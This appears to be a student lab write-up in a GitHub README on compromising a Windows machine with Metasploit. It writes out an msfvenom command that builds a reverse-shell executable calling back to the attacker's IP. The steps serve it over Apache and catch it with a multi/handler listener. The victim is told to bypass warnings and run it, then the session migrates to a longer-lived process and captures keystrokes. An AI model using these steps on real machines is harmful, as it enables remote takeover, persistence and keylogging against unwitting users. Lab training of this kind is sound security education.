# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## Program:
Find the attackers ip address using ifconfig

![244990907-d81c29e7-4cb2-4989-a4f0-32d0f4dcffa5](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/f13f76b8-883c-489c-956e-dcd7b8f84cf7)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![244990946-a8e477e7-1f5b-4831-a003-ffc199679313](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/ee5262d5-57a7-4622-b69a-d0cd2c16637e)

copy the fun.exe into the apache /var/www/html folder

![244991211-edc15bf9-0646-4d77-a7b2-7fbe6adae449](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/88e393c7-82d6-4b69-9f9a-4def8c91896f)

Start apache server sudo systemctl apache2 start

![244990956-f2bdb40b-22b8-409e-8295-7cac780eab89](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/55c78c3e-4868-4fd7-ab06-d8c940c858c2)

Check the status of apache2

![244990958-d5dca89e-d102-408d-aa25-d60e7e09ff2b](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/54feb6cf-1e59-417d-94b3-498b5127bf75)

Invoke msfconsole:

## Output:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler

![244990962-31c4d664-f12a-45a9-aa29-e988f03e88e1](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/931893c4-ef3d-4450-9916-94bed8b8ff6c)

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. 

![244990896-a6b73051-a143-4740-b3d9-27c23762218f](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/86fa7c6f-16ad-4b92-ab11-f24fe0e94e32)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![244990902-b46a08f7-a9fc-4e71-8fdd-170ee187dd22](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/1ccc1903-58ea-4a05-b1a1-c81878e66db4)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![244990924-7e6e28fb-b095-4fd1-81f8-a0292f82c9a2](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/446ba3f5-9d59-4c57-9c5c-19f8eeb87123)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![244990928-836e6efa-423f-4553-ad2f-19170b010892](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/2e3bc4ef-91ad-4da4-ae3c-90a4a622baf3)


Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name. 

![image](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/167539ad-9cba-49ac-9844-06688520e823)

keyscan_dump Shows the keystrokes captured so far 

![244990920-d40a4428-0c65-4855-be1d-c278766082fb](https://github.com/prithviraj5703/Compromising-windows-using-Metasploit/assets/121418418/4e298044-c4bc-45b4-a205-e30b340abaa7)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
